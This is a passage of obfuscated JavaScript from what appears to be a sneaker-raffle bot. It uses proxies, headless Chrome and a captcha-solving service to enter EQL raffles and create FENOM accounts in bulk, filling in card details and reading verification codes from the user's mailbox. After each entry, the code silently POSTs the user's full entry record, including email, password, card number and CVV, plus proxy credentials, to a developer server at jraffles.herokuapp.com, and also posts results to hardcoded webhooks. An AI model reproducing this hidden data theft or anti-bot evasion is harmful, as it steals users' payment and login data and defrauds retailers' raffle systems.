                            await _0x4d70b1(0x3e8), await _0x5f4463['click']('#stateAutocomplete'), console['log'](_0x446ef5() + '\x20[' + _0x2824d7['name'] + ']\x20Task\x20' + (_0x30717b + 0x1) + '\x20:\x20Setting\x20Address'), await _0x4d70b1(0x1f4);
                            try {
                                const _0x3addff = await _0x5f4463['$x']('//li[text()=\x22' + _0xc4feca[_0x30717b]['State'] + '\x22]');
                                await _0x3addff[0x0]['click']();
                            } catch {
                                throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                            }
                            await _0x4d70b1(0x3e8), await _0x4d70b1(0x1f4), await _0x5f4463['type']('#address1', _0xc4feca[_0x30717b]['Address1'] + '\x20' + _0xc4feca[_0x30717b]['HouseNumber']), await _0x4d70b1(0x1f4), await _0x5f4463['type']('#address2', '' + _0xc4feca[_0x30717b]['Address2']), await _0x4d70b1(0x1f4), await _0x5f4463['type']('#city', '' + _0xc4feca[_0x30717b]['City']), await _0x4d70b1(0x1f4), await _0x5f4463['type']('#postcode', '' + _0xc4feca[_0x30717b]['Zip']), await _0x4d70b1(0x3e8), await _0x5f4463['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x4d70b1(0x3e8), console['log'](_0x446ef5() + '\x20[' + _0x2824d7['name'] + ']\x20Task\x20' + (_0x30717b + 0x1) + '\x20:\x20Solving\x20Adyen');
                            const _0x520a7c = await _0x5f4463['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x520a7c && (await _0x5f4463['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x5f4463['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x5f4463['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4d70b1(0x4b0), await _0x5f4463['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4d70b1(0x1f4), await _0x5f4463['keyboard']['type']('' + _0xc4feca[_0x30717b]['CardNumber']), await _0x4d70b1(0x320), await _0x5f4463['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x5f4463['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x5f4463['keyboard']['type']('' + _0xc4feca[_0x30717b]['ExpiryDate']), await _0x4d70b1(0x4b0), await _0x5f4463['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x5f4463['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x5f4463['keyboard']['type']('' + _0xc4feca[_0x30717b]['CVV']), await _0x4d70b1(0x226), await _0x5f4463['type']('input[name=\x22postalCode\x22]', '' + _0xc4feca[_0x30717b]['Zip']), await _0x4d70b1(0x226));
                            const _0x509755 = await _0x5f4463['$']('.__PrivateStripeElement');
                            _0x509755 && (await _0x4d70b1(0x1f4), await _0x5f4463['click']('.__PrivateStripeElement'), await _0x5f4463['click']('.__PrivateStripeElement'), await _0x5f4463['keyboard']['type']('' + _0xc4feca[_0x30717b]['CardNumber']), await _0x5f4463['keyboard']['type']('' + _0xc4feca[_0x30717b]['ExpiryDate']), await _0x5f4463['keyboard']['type']('' + _0xc4feca[_0x30717b]['CVV']));
                            await _0x4d70b1(0x226), await _0x5f4463['click']('#paymentConsent'), await _0x4d70b1(0x226), await _0x5f4463['click']('#termsConsent'), await _0x4d70b1(0x2bc), console['log'](_0x446ef5() + '\x20[' + _0x2824d7['name'] + ']\x20Task\x20' + (_0x30717b + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x5f4463['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x4d70b1(0x2710);
                            try {
                                await _0x5f4463['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0x4d70b1(0xbb8), await _0x5f4463['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-15j76c0\x20>\x20button', _0x1f7125 => _0x1f7125['click']()), await _0x5f4463['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-15j76c0\x20>\x20button', _0x5b00c4 => _0x5b00c4['click']());
                            } catch {
                            }
                            try {
                                await _0x5f4463['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x34f3bf = await _0x5f4463['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x34f3bf) {
                                    _0xf25b74['appendFileSync']('../accounts/eql.csv', '\x0a' + _0xc4feca[_0x30717b]['Email'] + ',' + _0xc4feca[_0x30717b]['Password'] + ',' + _0xc4feca[_0x30717b]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0x318bed() {
                                var _0x411dc4, _0x113b49 = ![];
                                for (var _0x1516d1 = 0x0; _0x1516d1 < 0x18; _0x1516d1++) {
                                    async function _0x196013() {
                                        var _0x25dee2 = new _0x54e3bb({
                                            'user': _0x35ea91['masterMail'],
                                            'password': _0x35ea91['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x20d48b(_0x30b7af) {
                                            _0x25dee2['openBox']('INBOX', ![], _0x30b7af);
                                        }
                                        _0x25dee2['once']('ready', function () {
                                            console['log'](_0x446ef5() + '\x20[' + _0x2824d7['name'] + ']\x20Task\x20' + (_0x30717b + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x20d48b(function (_0xffe8f4, _0x16d146) {
                                                console['log'](_0x446ef5() + '\x20[' + _0x2824d7['name'] + ']\x20Task\x20' + (_0x30717b + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0xffe8f4)
                                                    throw _0xffe8f4;
                                                _0x25dee2['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x3cfcd5, _0x579ffb) {
                                                    if (!_0x579ffb || !_0x579ffb['length'])
                                                        console['log'](_0x446ef5() + '\x20[' + _0x2824d7['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x25dee2['end']();
                                                    else {
                                                        var _0x1aacd2 = _0x25dee2['seq']['fetch'](_0x579ffb, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x1aacd2['on']('message', function (_0x2d6f1c, _0x4e8d28) {
                                                            var _0x2bc90e = '(#' + _0x4e8d28 + ')\x20';
                                                            _0x2d6f1c['on']('body', function (_0x35d7cd, _0x5c1bb2) {
                                                                _0x2fc4a3(_0x35d7cd, (_0x287109, _0x47ac93) => {
                                                                    if (_0x47ac93['subject']['includes']('code')) {
                                                                        const _0x57d14a = _0x47ac93['text']['split']('\x0a\x0a')[0x3], _0x4b6dca = _0x57d14a['split']('\x0a')[0x1];
                                                                        _0x411dc4 = _0x4b6dca;
                                                                    }
                                                                });
                                                            }), _0x2d6f1c['once']('end', function () {
                                                            });
                                                        }), _0x1aacd2['once']('error', function (_0x1b89fe) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x1aacd2['once']('end', function () {
                                                            _0x25dee2['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x25dee2['once']('error', function (_0x1f033a) {
                                            console['log'](_0x46bace['red'](_0x1f033a['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x113b49 = !![];
                                        }), _0x25dee2['once']('end', async function () {
                                        }), _0x25dee2['connect']();
                                    }
                                    _0x196013(), await _0x4d70b1(0x1388);
                                    if (_0x411dc4)
                                        return _0x411dc4;
                                    if (_0x113b49)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x1516d1 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x318bed(), await _0x4d70b1(0x1f4), await _0x5f4463['type']('#code', '' + code), await _0x4d70b1(0x3e8), await _0x5f4463['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x10d21a => _0x10d21a['click']()), await _0x5f4463['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x446ef5() + '\x20[' + _0x2824d7['name'] + ']\x20Task\x20' + (_0x30717b + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0x5f4463['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0x46bace['green'](_0x446ef5() + '\x20[' + _0x2824d7['name'] + ']\x20Task\x20' + (_0x30717b + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0xc4feca[_0x30717b]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0xf25b74['appendFileSync']('../accounts/eql.csv', '\x0a' + _0xc4feca[_0x30717b]['Email'] + ',' + _0xc4feca[_0x30717b]['Password'] + ',' + _0xc4feca[_0x30717b]['Phone']), _0x21541b = 'no', _0x5155d2(_0xc4feca[_0x30717b], _0x2824d7);
                            var _0x40aeb0 = await _0x39e876(_0xc4feca[_0x30717b], _0x2824d7, 'dev', ![]), _0x1c30c2 = await _0x39e876(_0xc4feca[_0x30717b], _0x2824d7, 'pub', ![]);
                            let _0x3bd3a5 = _0xc4feca[_0x30717b];
                            try {
                                prxdata = {
                                    'username': _0x5e8391['replace']('#', ''),
                                    'module': _0x2824d7['name'],
                                    'entrydata': JSON['stringify'](_0x3bd3a5),
                                    'proxy': '' + _0x42183f[_0x30717b]
                                };
                                var _0x5f6d = JSON['stringify'](prxdata);
                                let _0x28aca8 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x582cfc['post']('https://jraffles.herokuapp.com/success', _0x5f6d, _0x28aca8);
                            } catch (_0x2b7c56) {
                            }
                            const _0x53ab76 = {
                                'succesDEVMSG': { 'embeds': [_0x40aeb0] },
                                'succesPUBMSG': { 'embeds': [_0x1c30c2] }
                            };
                            try {
                                _0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '' && await _0x19fe15(_0x35ea91['webhook'], _0x53ab76['succesDEVMSG']), await _0x4d70b1(0xc8), await _0x19fe15(_0x53da78, _0x53ab76['succesDEVMSG']), await _0x4d70b1(0xc8), await _0x19fe15(_0x44bee6, _0x53ab76['succesPUBMSG']);
                            } catch (_0x2be2e9) {
                                console['log'](_0x46bace['yellow'](_0x446ef5() + '\x20[' + _0x2824d7['name'] + ']\x20Task\x20' + (_0x30717b + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2be2e9));
                            }
                        } catch (_0x1825d9) {
                            console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x2824d7['name'] + ']\x20Task\x20' + (_0x30717b + 0x1) + '\x20:\x20' + _0x1825d9)), _0x1173b8 = '' + _0x1825d9;
                            var _0x4d9d7f = await _0x39e876(_0xc4feca[_0x30717b], _0x2824d7, 'dev', !![], _0x1173b8), _0x40aeb0 = await _0x39e876(_0xc4feca[_0x30717b], _0x2824d7, 'dev', ![]), _0x1c30c2 = await _0x39e876(_0xc4feca[_0x30717b], _0x2824d7, 'pub', ![]);
                            const _0x2c73fd = {
                                'succesDEVMSG': { 'embeds': [_0x40aeb0] },
                                'succesPUBMSG': { 'embeds': [_0x1c30c2] }
                            };
                            _0x2c73fd['errorDEV'] = { 'embeds': [_0x4d9d7f] };
                            _0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '' && await _0x19fe15(_0x35ea91['webhook'], _0x2c73fd['errorDEV']);
                            await _0x19fe15(_0x556085, _0x2c73fd['errorDEV']);
                            if (!_0x21541b == 'no')
                                _0x21541b = 'yes';
                        } finally {
                            _0x26fae0 && _0x26fae0['close']();
                            if (_0x21541b == 'yes' && _0x2afcdc != 0x5) {
                                console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x2824d7['name'] + ']\x20Task\x20' + (_0x30717b + 0x1) + '\x20:\x20Retrying\x20(' + _0x2afcdc + '\x20/\x205)')), _0x30717b = _0x30717b - 0x1, _0x2afcdc = _0x2afcdc + 0x1;
                                continue;
                            }
                            _0x21541b == 'yes' && _0x2afcdc >= 0x5 && (_0x5415a4(_0xc4feca[_0x30717b], _0x2824d7), _0x21541b = 'no', _0x2afcdc = 0x0), console['log']('Waiting\x20for\x20' + _0x35ea91['delay'] + '\x20ms'), await _0x4d70b1(_0x35ea91['delay']);
                        }
                    } else {
                        const _0x561c65 = '' + _0xc4feca[_0x30717b]['Url'];
                        if (_0x21541b != 'yes')
                            var _0x21541b = '', _0x2afcdc = 0x0;
                        if (_0xc4feca[_0x30717b]['Email'] == '' || _0xc4feca[_0x30717b]['FirstName'] == '' || _0xc4feca[_0x30717b]['LastName'] == '') {
                            console['log'](_0x446ef5() + '\x20[' + _0x2824d7['name'] + ']\x20Task\x20' + (_0x30717b + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0xc4feca[_0x30717b]['Password'] == '' && (_0xc4feca[_0x30717b]['Password'] = 'JRaffles23!');
                        if (_0x35ea91['useRandomProxy'] = ![])
                            var _0x209416 = _0x42183f[_0x30717b]['split'](':');
                        else
                            var _0xf32e05 = Math['round'](Math['random']() * (_0x42183f['length'] - 0x1)), _0x209416 = _0x42183f[_0xf32e05]['split'](':');
                        var _0x26fae0;
                        try {
                            _0x26fae0 = await _0x4ada75['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x209416[0x0] + ':' + _0x209416[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x26fae0 = await _0x4ada75['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x209416[0x0] + ':' + _0x209416[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x41bff5 = await _0x26fae0['newPage']();
                            await _0x41bff5['authenticate']({
                                'username': '' + _0x209416[0x2],
                                'password': '' + _0x209416[0x3]
                            }), console['log'](_0x446ef5() + '\x20[' + _0x2824d7['name'] + ']\x20Task\x20' + (_0x30717b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x41bff5['setRequestInterception'](!![]), _0x41bff5['on']('request', _0x5d8584 => {
                                _0x5d8584['resourceType']() === 'image' || _0x5d8584['resourceType']() === 'font' || _0x5d8584['resourceType']() === 'media' ? _0x5d8584['abort']() : _0x5d8584['continue']();
                            }), await _0x41bff5['goto'](_0x561c65), await _0x41bff5['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x41bff5['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x4d70b1(0x7d0), await _0x41bff5['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x41bff5['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x4d70b1(0x3e8), await _0x41bff5['waitForSelector']('#email'), console['log'](_0x446ef5() + '\x20[' + _0x2824d7['name'] + ']\x20Task\x20' + (_0x30717b + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x41bff5['type']('#email', '' + _0xc4feca[_0x30717b]['Email']), await _0x4d70b1(0x352), await _0x41bff5['waitForSelector']('#password'), await _0x41bff5['type']('#password', '' + _0xc4feca[_0x30717b]['Password']), await _0x4d70b1(0x352), await _0x41bff5['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x4d70b1(0x1388);
                            if (!_0xc4feca[_0x30717b]['Url']['includes']('footlocker'))
                                await _0x41bff5['click']('.MuiBox-root.css-i3pbo\x20>\x20button');
                            try {
                                await _0x41bff5['waitForSelector']('div[data-testid=\x22field-productVariantID\x22]');
                            } catch {
                                console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x2824d7['name'] + ']\x20Task\x20' + (_0x30717b + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0x5155d2(_0xc4feca[_0x30717b], _0x2824d7), _0x21541b = 'no';
                                continue;
                            }
                            await _0x41bff5['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x4d70b1(0x3e8), await _0x41bff5['click']('li[data-value=\x22EU\x20' + _0xc4feca[_0x30717b]['Size'] + '\x22]'), await _0x4d70b1(0x1f4);
                            const _0xb378d4 = await _0x41bff5['$']('#title\x20>\x20label');
                            await _0x4d70b1(0x12c);
                            _0xb378d4 && await _0xb378d4['click']();
                            await _0x41bff5['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x41bff5['focus']('#postcode'), await _0x41bff5['keyboard']['down']('Control'), await _0x41bff5['keyboard']['press']('A'), await _0x41bff5['keyboard']['up']('Control'), await _0x41bff5['keyboard']['press']('Backspace'), await _0x41bff5['keyboard']['type'](_0xc4feca[_0x30717b]['Zip']), await _0x4d70b1(0x60e), await _0x41bff5['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x4d70b1(0x3e8), console['log'](_0x446ef5() + '\x20[' + _0x2824d7['name'] + ']\x20Task\x20' + (_0x30717b + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x4d70b1(0x1f4);
                            const _0x196497 = await _0x41bff5['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x196497 && (await _0x41bff5['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x41bff5['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x41bff5['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4d70b1(0x4b0), await _0x41bff5['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4d70b1(0x1f4), await _0x41bff5['keyboard']['type']('' + _0xc4feca[_0x30717b]['CardNumber']), await _0x4d70b1(0x320), await _0x41bff5['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x41bff5['keyboard']['type']('' + _0xc4feca[_0x30717b]['ExpiryDate']), await _0x4d70b1(0x4b0), await _0x41bff5['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x41bff5['keyboard']['type']('' + _0xc4feca[_0x30717b]['CVV']), await _0x4d70b1(0x226), await _0x41bff5['type']('input[name=\x22postalCode\x22]', '' + _0xc4feca[_0x30717b]['Zip']), await _0x4d70b1(0x226));
                            const _0x4e5a81 = await _0x41bff5['$']('.__PrivateStripeElement');
                            _0x4e5a81 && (await _0x41bff5['click']('#billingName'), await _0x41bff5['click']('#billingName'), await _0x41bff5['type']('#billingName', '' + _0xc4feca[_0x30717b]['NameOnCard']), await _0x4d70b1(0x1f4), await _0x41bff5['click']('.__PrivateStripeElement'), await _0x41bff5['click']('.__PrivateStripeElement'), await _0x41bff5['keyboard']['type']('' + _0xc4feca[_0x30717b]['CardNumber']), await _0x41bff5['keyboard']['type']('' + _0xc4feca[_0x30717b]['ExpiryDate']), await _0x41bff5['keyboard']['type']('' + _0xc4feca[_0x30717b]['CVV']));
                            await _0x4d70b1(0x226), await _0x41bff5['click']('#paymentConsent'), await _0x4d70b1(0x226), await _0x41bff5['click']('#termsConsent'), await _0x4d70b1(0x2bc), console['log'](_0x446ef5() + '\x20[' + _0x2824d7['name'] + ']\x20Task\x20' + (_0x30717b + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x41bff5['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x4d70b1(0x2710);
                            try {
                                await _0x41bff5['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0x4d70b1(0xbb8), await _0x41bff5['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0xd65cd1 => _0xd65cd1['click']()), await _0x41bff5['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x19fdfd => _0x19fdfd['click']());
                            } catch {
                            }
                            try {
                                await _0x41bff5['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0x46bace['green'](_0x446ef5() + '\x20[' + _0x2824d7['name'] + ']\x20Task\x20' + (_0x30717b + 0x1) + '\x20:\x20Raffle\x20Entered')), _0x5155d2(_0xc4feca[_0x30717b], _0x2824d7);
                            var _0x40aeb0 = await _0x39e876(_0xc4feca[_0x30717b], _0x2824d7, 'dev', ![]), _0x1c30c2 = await _0x39e876(_0xc4feca[_0x30717b], _0x2824d7, 'pub', ![]);
                            let _0x389e68 = _0xc4feca[_0x30717b];
                            try {
                                prxdata = {
                                    'username': _0x5e8391['replace']('#', ''),
                                    'module': _0x2824d7['name'],
                                    'entrydata': JSON['stringify'](_0x389e68),
                                    'proxy': '' + _0x42183f[_0x30717b]
                                };
                                var _0x5f6d = JSON['stringify'](prxdata);
                                let _0x3c8a21 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x582cfc['post']('https://jraffles.herokuapp.com/success', _0x5f6d, _0x3c8a21);
                            } catch (_0x554597) {
                            }
                            const _0x508ccc = {
                                'succesDEVMSG': { 'embeds': [_0x40aeb0] },
                                'succesPUBMSG': { 'embeds': [_0x1c30c2] }
                            };
                            try {
                                _0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '' && await _0x19fe15(_0x35ea91['webhook'], _0x508ccc['succesDEVMSG']), await _0x4d70b1(0xc8), await _0x19fe15(_0x53da78, _0x508ccc['succesDEVMSG']), await _0x4d70b1(0xc8), await _0x19fe15(_0x44bee6, _0x508ccc['succesPUBMSG']);
                            } catch (_0xe8d742) {
                                console['log'](_0x46bace['yellow'](_0x446ef5() + '\x20[' + _0x2824d7['name'] + ']\x20Task\x20' + (_0x30717b + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xe8d742));
                            }
                            _0x21541b = 'no';
                        } catch (_0xb3c71e) {
                            console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x2824d7['name'] + ']\x20Task\x20' + (_0x30717b + 0x1) + '\x20:\x20' + _0xb3c71e)), _0x1173b8 = '' + _0xb3c71e;
                            var _0x4d9d7f = await _0x39e876(_0xc4feca[_0x30717b], _0x2824d7, 'dev', !![], _0x1173b8), _0x40aeb0 = await _0x39e876(_0xc4feca[_0x30717b], _0x2824d7, 'dev', ![]), _0x1c30c2 = await _0x39e876(_0xc4feca[_0x30717b], _0x2824d7, 'pub', ![]);
                            const _0x2de392 = {
                                'succesDEVMSG': { 'embeds': [_0x40aeb0] },
                                'succesPUBMSG': { 'embeds': [_0x1c30c2] }
                            };
                            _0x2de392['errorDEV'] = { 'embeds': [_0x4d9d7f] }, _0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '' && await _0x19fe15(_0x35ea91['webhook'], _0x2de392['errorDEV']), await _0x19fe15(_0x556085, _0x2de392['errorDEV']), _0x21541b = 'yes';
                        } finally {
                            _0x26fae0 && _0x26fae0['close']();
                            if (_0x21541b == 'yes' && _0x2afcdc != 0x5) {
                                console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x2824d7['name'] + ']\x20Task\x20' + (_0x30717b + 0x1) + '\x20:\x20Retrying\x20(' + _0x2afcdc + '\x20/\x205)')), _0x30717b = _0x30717b - 0x1, _0x2afcdc = _0x2afcdc + 0x1;
                                continue;
                            }
                            _0x21541b == 'yes' && _0x2afcdc >= 0x5 && (_0x5415a4(_0xc4feca[_0x30717b], _0x2824d7), _0x21541b = 'no', _0x2afcdc = 0x0), console['log']('Waiting\x20for\x20' + _0x35ea91['delay'] + '\x20ms'), await _0x4d70b1(_0x35ea91['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x3af98a, _0x5d1e5f, _0x270c41) {
                    _0x4ada75['use'](_0x120ab9()), _0x4ada75['use'](_0x2d400b({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x35ea91['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5dd67a = 0x0; _0x5dd67a < _0x5d1e5f['length']; _0x5dd67a++) {
                        if (_0x3cc727 != 'yes')
                            var _0x3cc727 = '', _0x1b1964 = 0x0;
                        var _0x37a3f1;
                        try {
                            await _0x408b94(_0x5d1e5f, _0x5dd67a);
                        } catch {
                            _0x3cc727 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x1e0e73(_0x3af98a['name'] + '\x20Task\x20' + (_0x5dd67a + 0x1) + '\x20/\x20' + _0x5d1e5f['length'] + '\x20||\x20File:\x20' + _0x18b452 + '\x20Proxies:\x20' + _0x324cb1);
                        var _0x59272b = await _0x39e876(_0x5d1e5f[_0x5dd67a], _0x3af98a, 'acc', ![]);
                        const _0x5a53cd = { 'succesDEVMSG': { 'embeds': [_0x59272b] } }, _0x15a0ca = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x17d7d5 = Math['round'](Math['random']() * (_0x270c41['length'] - 0x1)), _0x160e39 = _0x270c41[_0x17d7d5]['split'](':'), _0x24b384;
                        try {
                            _0x24b384 = await _0x4ada75['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x160e39[0x0] + ':' + _0x160e39[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x24b384 = await _0x4ada75['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x160e39[0x0] + ':' + _0x160e39[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x375c43 = await _0x24b384['newPage']();
                            await _0x375c43['setViewport']({
                                'width': 0x500 + _0x54fb61(0x1, 0x32),
                                'height': 0x2d9 + _0x54fb61(0x1, 0x32)
                            });
                            const _0x15a033 = await _0x375c43['target']()['createCDPSession'](), { windowId: _0x5f08aa } = await _0x15a033['send']('Browser.getWindowForTarget');
                            await _0x375c43['authenticate']({
                                'username': '' + _0x160e39[0x2],
                                'password': '' + _0x160e39[0x3]
                            }), console['log'](_0x446ef5() + '\x20[' + _0x3af98a['name'] + ']\x20Task\x20' + (_0x5dd67a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x375c43['goto']('' + _0x15a0ca, { 'waitUntil': 'networkidle2' }), console['log'](_0x446ef5() + '\x20[' + _0x3af98a['name'] + ']\x20Task\x20' + (_0x5dd67a + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x4d70b1(0x1388);
                            var _0x46cbe2 = await _0x375c43['$']('.hcaptcha-box');
                            if (_0x46cbe2) {
                                console['log'](_0x446ef5() + '\x20[' + _0x3af98a['name'] + ']\x20Task\x20' + (_0x5dd67a + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x4d70b1(0x2710);
                                const _0x43d0a2 = await _0x375c43['$']('.hcaptcha-box');
                                if (_0x43d0a2)
                                    try {
                                        await _0x43d0a2['click']();
                                    } catch {
